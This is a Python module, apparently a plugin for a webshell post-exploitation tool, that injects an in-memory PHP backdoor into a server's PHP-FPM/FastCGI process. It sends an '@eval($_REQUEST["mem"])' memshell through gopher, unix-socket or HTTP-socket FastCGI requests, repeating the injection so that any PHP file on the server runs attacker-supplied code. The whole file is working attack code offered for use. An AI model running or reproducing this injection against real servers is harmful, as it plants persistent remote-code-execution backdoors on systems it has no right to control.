from time import sleep

from libs.utils import try_decode_base64
from libs.config import alias, color
from libs.myapp import send, get_php_system
from auxiliary.fpm.fpm import generate_memshell_payload, generate_base64_socks_memshell_payload


@alias(True, _type="OTHER")
def run():
    """
    memshell

    (Only for fastcgi) inject memshell into fastcgi, which you can eval everywhere.

    Reference: https://tttang.com/archive/1720/

    eg: memshell
    """
    res = send("print(php_sapi_name());")

    if (not res):
        print(color.red("\nNo response\n"))
        return False

    print(color.yellow("php_sapi_name: " + res.r_text))

    requirements_dict = {'host': '127.0.0.1', 'port': 9000,
                         'php_exist_file_path': '/var/www/html/index.php', 'memshell': '@eval($_REQUEST["mem"]);', 'repeat_time': 5}

    attack_type = input(
        "attack_type[gopher(need curl extension)/sock/http_sock]:").lower()

    if (attack_type not in ["gopher", "sock", "http_sock"]):
        return False

    # input sock path
    sock_path = ""
    if (attack_type == "sock"):
        sock_path = "/var/run/php7-fpm.sock"
        new_v = input(f"sock_path[{sock_path}]:")
        if new_v:
            sock_path = new_v
    else:
        # input fpm http host and port
        for k, v in requirements_dict.items():
            msg = f"{k}[{v}]:"
            if k == "memshell":
                msg = f"memshell in base64 format[{v}]:"
            new_v = input(msg)
            if k in ['port', 'repeat_time']:
                new_v = new_v if new_v else v
                try:
                    new_v = int(new_v)
                except ValueError:
                    print(color.red("\n%s must be number\n" % k))
                    return False
            if new_v:
                requirements_dict[k] = new_v

    # attack
    memshell_code = try_decode_base64(requirements_dict['memshell'])
    bdf_mode = 10
    phpcode = ""
    host = requirements_dict['host']
    port = requirements_dict['port']
    php_file_path = requirements_dict['php_exist_file_path']
    repeat_time = requirements_dict['repeat_time']
    print_command = ""

    if attack_type == "gopher":
        phpcode += get_php_system(bdf_mode)[attack_type] % (
            generate_memshell_payload(host, port, memshell_code, php_file_path), print_command)
    elif attack_type in ["sock", "http_sock"]:
        phpcode += """
            $sock_path='%s';
            $host='%s';
            $port=%s;
    """ % (sock_path, host, port)

        phpcode += get_php_system(bdf_mode)[attack_type]
        phpcode += "fwrite($sock, base64_decode('%s'));" % (
            generate_base64_socks_memshell_payload(host, port, memshell_code, php_file_path))

    for _ in range(repeat_time):
        send(phpcode)
        sleep(0.5)

    print("\ninject memshell finished. try to access any php file. your memshell code: " + color.green(memshell_code))
